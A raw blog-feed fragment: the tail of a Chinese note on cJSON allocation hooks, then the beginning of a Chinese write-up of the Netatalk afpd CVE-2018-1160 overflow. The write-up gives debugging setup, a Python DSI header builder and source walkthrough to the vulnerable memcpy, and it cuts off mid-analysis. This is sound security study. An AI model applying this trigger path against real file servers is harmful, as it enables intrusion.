'...' is not static */</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span> CJSON_CDECL <span class="token function">internal_malloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> CJSON_CDECL <span class="token function">internal_free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>pointer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">free</span><span class="token punctuation">(</span>pointer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span> CJSON_CDECL <span class="token function">internal_realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>pointer<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">realloc</span><span class="token punctuation">(</span>pointer<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">internal_malloc</span> <span class="token expression">malloc</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">internal_free</span> <span class="token expression">free</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">internal_realloc</span> <span class="token expression">realloc</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>定义global_hooks</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> internal_hooks global_hooks <span class="token operator">=</span> <span class="token punctuation">&#123;</span> internal_malloc<span class="token punctuation">,</span> internal_free<span class="token punctuation">,</span> internal_realloc <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>初始化global_hooks</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">CJSON_PUBLIC</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token function">cJSON_InitHooks</span><span class="token punctuation">(</span>cJSON_Hooks<span class="token operator">*</span> hooks<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hooks <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">/* 分配默认使用 malloc, free, realloc */</span>        <span class="token comment">/* Reset hooks */</span>        global_hooks<span class="token punctuation">.</span>allocate <span class="token operator">=</span> malloc<span class="token punctuation">;</span>        global_hooks<span class="token punctuation">.</span>deallocate <span class="token operator">=</span> free<span class="token punctuation">;</span>        global_hooks<span class="token punctuation">.</span>reallocate <span class="token operator">=</span> realloc<span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 可自定义 hooks */</span>    global_hooks<span class="token punctuation">.</span>allocate <span class="token operator">=</span> malloc<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hooks<span class="token operator">-></span>malloc_fn <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        global_hooks<span class="token punctuation">.</span>allocate <span class="token operator">=</span> hooks<span class="token operator">-></span>malloc_fn<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    global_hooks<span class="token punctuation">.</span>deallocate <span class="token operator">=</span> free<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hooks<span class="token operator">-></span>free_fn <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        global_hooks<span class="token punctuation">.</span>deallocate <span class="token operator">=</span> hooks<span class="token operator">-></span>free_fn<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* use realloc only if both free and malloc are used */</span>    global_hooks<span class="token punctuation">.</span>reallocate <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>global_hooks<span class="token punctuation">.</span>allocate <span class="token operator">==</span> malloc<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>global_hooks<span class="token punctuation">.</span>deallocate <span class="token operator">==</span> free<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        global_hooks<span class="token punctuation">.</span>reallocate <span class="token operator">=</span> realloc<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 粗糙笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 草稿 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-1160</title>
      <link href="/2022/01/25/cve-2018-1160/"/>
      <url>/2022/01/25/cve-2018-1160/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2018-1160"><a href="#CVE-2018-1160" class="headerlink" title="CVE-2018-1160"></a>CVE-2018-1160</h1><h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>我做题的时候主要参考以下3篇wp，本文可以配合这3篇wp食用：</p><p><a href="https://gtrboy.github.io/posts/netatalk/">gtrboy</a></p><p><a href="https://ruan777.github.io/2020/02/14/Netatalk-CVE-2018-1160-%E5%88%86%E6%9E%90/">ruan</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/11/06/netatalk/">Clang裁缝店</a></p><h2 id="运行与调试"><a href="#运行与调试" class="headerlink" title="运行与调试"></a>运行与调试</h2><p>在ubuntu18.04下运行：</p><pre class="line-numbers language-none"><code class="language-none">$ LD_PRELOAD&#x3D;&quot;.&#x2F;libatalk.so.18&quot;  .&#x2F;afpd -d -F .&#x2F;afp.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由afp.conf可知，程序会监听5566端口：</p><pre class="line-numbers language-none"><code class="language-none">[Global]afp port &#x3D; 5566disconnect time &#x3D; 0max connections &#x3D; 1000sleep time &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">$ sudo netstat -pantu | grep 5566tcp6       0      0 :::5566                 :::*                    LISTEN      4037&#x2F;.&#x2F;afpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>调试的时候直接attach进程号，而且由于我们攻击的是fork出来的子进程，所以需要让gdb跟进子进程：</p><pre class="line-numbers language-none"><code class="language-none">$ sudo gdb --pid 4037 -qpwndbg&gt; set follow-fork-mode child<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><a href="https://sourceforge.net/projects/netatalk/files/netatalk/3.1.11/">源码下载</a></p><p>我们主要关注 <code>/etc/afpd</code> 和 <code>/libatalk</code> 两个文件夹，前者是主体，后者是功能库。</p><h3 id="DSI"><a href="#DSI" class="headerlink" title="DSI"></a>DSI</h3><p>用户与afpd交互主要是通过<a href="https://en.wikipedia.org/wiki/Data_Stream_Interface">DSI</a>数据包，其格式如下：<br><a href="https://imgtu.com/i/77bjoj"><img src="https://s4.ax1x.com/2022/01/25/77bjoj.png" alt="DSI标准"></a><br>我们将Payload前面的部分称为Header，我们的Header如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gen_header</span><span class="token punctuation">(</span>payload_len<span class="token punctuation">)</span><span class="token punctuation">:</span>    header <span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token comment"># Flags: request(0)</span>    <span class="token comment"># 由于漏洞点位于 dsi_opensession，故 Command = 4</span>    header <span class="token operator">+=</span> <span class="token string">"\x04"</span><span class="token comment"># Command: DSIOpenSession(4)</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x01"</span><span class="token comment"># Request ID</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span><span class="token comment"># Error code/ enclosed data offset: 0</span>    header <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">I"</span><span class="token punctuation">,</span> payload_len<span class="token punctuation">)</span><span class="token comment"># Total data length</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span><span class="token comment"># Reserved</span>    <span class="token keyword">return</span> header<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DSI数据包发送给netatalk后，在main()函数中处理数据，用DSI结构体保存。可以看到，我们上面的Header其实就是保存在dsi_block结构体中的：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSI_BLOCKSIZ</span> <span class="token expression"><span class="token number">16</span></span></span><span class="token keyword">struct</span> <span class="token class-name">dsi_block</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">uint8_t</span> dsi_flags<span class="token punctuation">;</span>       <span class="token comment">/* packet type: request or reply */</span>    <span class="token keyword">uint8_t</span> dsi_command<span class="token punctuation">;</span>     <span class="token comment">/* command */</span>    <span class="token keyword">uint16_t</span> dsi_requestID<span class="token punctuation">;</span>  <span class="token comment">/* request ID */</span>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">uint32_t</span> dsi_code<span class="token punctuation">;</span>   <span class="token comment">/* error code */</span>        <span class="token keyword">uint32_t</span> dsi_doff<span class="token punctuation">;</span>   <span class="token comment">/* data offset */</span>    <span class="token punctuation">&#125;</span> dsi_data<span class="token punctuation">;</span>    <span class="token keyword">uint32_t</span> dsi_len<span class="token punctuation">;</span>        <span class="token comment">/* total data length */</span>    <span class="token keyword">uint32_t</span> dsi_reserved<span class="token punctuation">;</span>   <span class="token comment">/* reserved field */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSI_DATASIZ</span>       <span class="token expression"><span class="token number">65536</span></span></span><span class="token comment">/* child and parent processes might interpret a couple of these * differently. */</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">DSI</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">DSI</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>             <span class="token comment">/* multiple listening addresses */</span>    AFPObj   <span class="token operator">*</span>AFPobj<span class="token punctuation">;</span>    <span class="token keyword">int</span>      statuslen<span class="token punctuation">;</span>    <span class="token keyword">char</span>     status<span class="token punctuation">[</span><span class="token number">1400</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span>     <span class="token operator">*</span>signature<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">dsi_block</span>        header<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_storage</span> server<span class="token punctuation">,</span> client<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">itimerval</span>        timer<span class="token punctuation">;</span>    <span class="token keyword">int</span>      tickle<span class="token punctuation">;</span>            <span class="token comment">/* tickle count */</span>    <span class="token keyword">int</span>      in_write<span class="token punctuation">;</span>          <span class="token comment">/* in the middle of writing multiple packets,                                   signal handlers can't write to the socket */</span>    <span class="token keyword">int</span>      msg_request<span class="token punctuation">;</span>       <span class="token comment">/* pending message to the client */</span>    <span class="token keyword">int</span>      down_request<span class="token punctuation">;</span>      <span class="token comment">/* pending SIGUSR1 down in 5 mn */</span>    <span class="token keyword">uint32_t</span> attn_quantum<span class="token punctuation">,</span> datasize<span class="token punctuation">,</span> server_quantum<span class="token punctuation">;</span>    <span class="token keyword">uint16_t</span> serverID<span class="token punctuation">,</span> clientID<span class="token punctuation">;</span>    <span class="token keyword">uint8_t</span>  <span class="token operator">*</span>commands<span class="token punctuation">;</span> <span class="token comment">/* DSI recieve buffer */</span>    <span class="token keyword">uint8_t</span>  data<span class="token punctuation">[</span>DSI_DATASIZ<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* DSI reply buffer */</span>    size_t   datalen<span class="token punctuation">,</span> cmdlen<span class="token punctuation">;</span>    off_t    read_count<span class="token punctuation">,</span> write_count<span class="token punctuation">;</span>    <span class="token keyword">uint32_t</span> flags<span class="token punctuation">;</span>             <span class="token comment">/* DSI flags like DSI_SLEEPING, DSI_DISCONNECTED */</span>    <span class="token keyword">int</span>      socket<span class="token punctuation">;</span>            <span class="token comment">/* AFP session socket */</span>    <span class="token keyword">int</span>      serversock<span class="token punctuation">;</span>        <span class="token comment">/* listening socket */</span>    <span class="token comment">/* DSI readahead buffer used for buffered reads in dsi_peek */</span>    size_t   dsireadbuf<span class="token punctuation">;</span>        <span class="token comment">/* size of the DSI readahead buffer used in dsi_peek() */</span>    <span class="token keyword">char</span>     <span class="token operator">*</span>buffer<span class="token punctuation">;</span>           <span class="token comment">/* buffer start */</span>    <span class="token keyword">char</span>     <span class="token operator">*</span>start<span class="token punctuation">;</span>            <span class="token comment">/* current buffer head */</span>    <span class="token keyword">char</span>     <span class="token operator">*</span>eof<span class="token punctuation">;</span>              <span class="token comment">/* end of currently used buffer */</span>    <span class="token keyword">char</span>     <span class="token operator">*</span>end<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">USE_ZEROCONF</span></span>    <span class="token keyword">char</span> <span class="token operator">*</span>bonjourname<span class="token punctuation">;</span>      <span class="token comment">/* server name as UTF8 maxlen MAXINSTANCENAMELEN */</span>    <span class="token keyword">int</span> zeroconf_registered<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token comment">/* protocol specific open/close, send/receive     * send/receive fill in the header and use dsi->commands.     * write/read just write/read data */</span>    <span class="token function">pid_t</span>  <span class="token punctuation">(</span><span class="token operator">*</span>proto_open<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">DSI</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span>   <span class="token punctuation">(</span><span class="token operator">*</span>proto_close<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">DSI</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> DSI<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><p>总结：<code>main() -&gt; dsi_start() -&gt; dis_getsession() -&gt; dsi_opensession(): memcpy()</code></p><ul><li><p>main()(@/etc/afpd/main.c)：main()函数先进行一系列初始化工作，包括解析配置文件，初始化socket、初始化dsi结构体等，之后调用dsi_start()函数。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> ac<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>av<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> asev<span class="token operator">-></span>used<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>asev<span class="token operator">-></span>fdset<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> <span class="token punctuation">(</span>POLLIN <span class="token operator">|</span> POLLERR <span class="token operator">|</span> POLLHUP <span class="token operator">|</span> POLLNVAL<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">switch</span> <span class="token punctuation">(</span>asev<span class="token operator">-></span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>fdtype<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">case</span> LISTEN_FD<span class="token operator">:</span>    <span class="token comment">/**************************************************    main() -> dis_start()    **************************************************/</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>child <span class="token operator">=</span> <span class="token function">dsi_start</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>obj<span class="token punctuation">,</span> <span class="token punctuation">(</span>DSI <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>asev<span class="token operator">-></span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">private</span><span class="token punctuation">)</span><span class="token punctuation">,</span> server_children<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">asev_add_fd</span><span class="token punctuation">(</span>asev<span class="token punctuation">,</span> child<span class="token operator">-></span>afpch_ipc_fd<span class="token punctuation">,</span> IPC_FD<span class="token punctuation">,</span> child<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token function">LOG</span><span class="token punctuation">(</span>log_error<span class="token punctuation">,</span> logtype_afpd<span class="token punctuation">,</span> <span class="token string">"out of asev slots"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment">/*                             * Close IPC fd here and mark it as unused                             */</span>                            <span class="token function">close</span><span class="token punctuation">(</span>child<span class="token operator">-></span>afpch_ipc_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>                            child<span class="token operator">-></span>afpch_ipc_fd <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>                            <span class="token comment">/*                             * Being unfriendly here, but we really                             * want to get rid of it. The 'child'                             * handle gets cleaned up in the SIGCLD                             * handler.                             */</span>                            <span class="token function">kill</span><span class="token punctuation">(</span>child<span class="token operator">-></span>afpch_pid<span class="token punctuation">,</span> SIGKILL<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>dsi_start()(@/etc/afpd/main.c)：dsi_start()函数先调用dsi_getsession()函数获取TCP会话，解析请求消息，之后调用afp_over_dsi()函数进行会话内容的处理。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> afp_child_t <span class="token operator">*</span><span class="token function">dsi_start</span><span class="token punctuation">(</span>AFPObj <span class="token operator">*</span>obj<span class="token punctuation">,</span> DSI <span class="token operator">*</span>dsi<span class="token punctuation">,</span> server_child_t <span class="token operator">*</span>server_children<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    afp_child_t <span class="token operator">*</span>child <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dsi_getsession</span><span class="token punctuation">(</span>dsi<span class="token punctuation">,</span> server_children<span class="token punctuation">,</span> obj<span class="token operator">-></span>options<span class="token punctuation">.</span>tickleval<span class="token punctuation">,</span> <span class="token operator">&amp;</span>child<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">LOG</span><span class="token punctuation">(</span>log_error<span class="token punctuation">,</span> logtype_afpd<span class="token punctuation">,</span> <span class="token string">"dsi_start: session error: %s"</span><span class="token punctuation">,</span> <span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* we've forked. */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>child <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">configfree</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> dsi<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">afp_over_dsi</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* start a session */</span>        <span class="token function">exit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> child<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>dis_getsession()(@/libatalk/dsi/dsi_getsess.c)：dis_getsession()函数开启一个DSI会话，从TCP socket接收会话消息，保存至结构体DSI中。 函数首先调用dsi-&gt;proto_open(dsi)进行TCP消息的接收和处理，该函数实体为dsi_tcp_open()。根据返回值是父进程还是子进程，进入不同的处理逻辑。父进程则直接返回，继续监听；子进程则进入之后的DSI消息处理逻辑，根据dsi_command的值（下面在结构体中介绍），选择不同的处理方式，若dsi_command为DSIFUNC_OPEN，则调用dsi_opensession()函数，初始化DSI会话。其中，dsi_tcp_open()将接收的数据保存至DSI结构体中。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">dsi_getsession</span><span class="token punctuation">(</span>DSI <span class="token operator">*</span>dsi<span class="token punctuation">,</span> server_child_t <span class="token operator">*</span>serv_children<span class="token punctuation">,</span> <span class="token keyword">int</span> tickleval<span class="token punctuation">,</span> afp_child_t <span class="token operator">*</span><span class="token operator">*</span>childp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>pid <span class="token operator">=</span> dsi<span class="token operator">-></span><span class="token function">proto_open</span><span class="token punctuation">(</span>dsi<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* in libatalk/dsi/dsi_tcp.c */</span>  <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span>    <span class="token comment">/* if we fail, just return. it might work later */</span>    <span class="token function">LOG</span><span class="token punctuation">(</span>log_error<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"dsi_getsess: %s"</span><span class="token punctuation">,</span> <span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span> <span class="token comment">/* child. mostly handled below. */</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">default</span><span class="token operator">:</span> <span class="token comment">/* parent */</span>    <span class="token comment">/* using SIGKILL is hokey, but the child might not have     * re-established its signal handler for SIGTERM yet. */</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    dsi<span class="token operator">-></span><span class="token function">proto_close</span><span class="token punctuation">(</span>dsi<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>childp <span class="token operator">=</span> child<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_command<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">case</span> DSIFUNC_STAT<span class="token operator">:</span> <span class="token comment">/* send off status and return */</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">case</span> DSIFUNC_OPEN<span class="token operator">:</span> <span class="token comment">/* setup session */</span>    <span class="token comment">/* set up the tickle timer */</span>    dsi<span class="token operator">-></span>timer<span class="token punctuation">.</span>it_interval<span class="token punctuation">.</span>tv_sec <span class="token operator">=</span> dsi<span class="token operator">-></span>timer<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_sec <span class="token operator">=</span> tickleval<span class="token punctuation">;</span>    dsi<span class="token operator">-></span>timer<span class="token punctuation">.</span>it_interval<span class="token punctuation">.</span>tv_usec <span class="token operator">=</span> dsi<span class="token operator">-></span>timer<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_usec <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">dsi_opensession</span><span class="token punctuation">(</span>dsi<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>childp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">default</span><span class="token operator">:</span> <span class="token comment">/* just close */</span>    <span class="token function">LOG</span><span class="token punctuation">(</span>log_info<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"DSIUnknown %d"</span><span class="token punctuation">,</span> dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_command<span class="token punctuation">)</span><span class="token punctuation">;</span>    dsi<span class="token operator">-></span><span class="token function">proto_close</span><span class="token punctuation">(</span>dsi<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXITERR_CLNT<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>dsi_opensession()(@/libatalk/dsi/dsi_opensess.c)：dsi_opensession()函数首先根据commands[0]的内容决定处理逻辑，若为DSIOPT_ATTNQUANT，则执行memcpy，以commands[1]为大小，将commands[2]之后的内容拷贝至DSI结构体的attn_quantum成员变量（4 bytes）。之后程序会构建新的DSI消息到dsi-&gt;commands中， <strong>将server_quantum的值返回给客户端</strong> 。漏洞点在 <code>memcpy(&amp;dsi-&gt;attn_quantum, dsi-&gt;commands + i + 1, dsi-&gt;commands[i])</code> ，这里的 dsi-&gt;commands 就是DSI数据包结构中的Payload，解析结构为 <code>dsi-&gt;commands = 功能码(1 byte) + 数据长度(1 byte) + 数据载荷(n 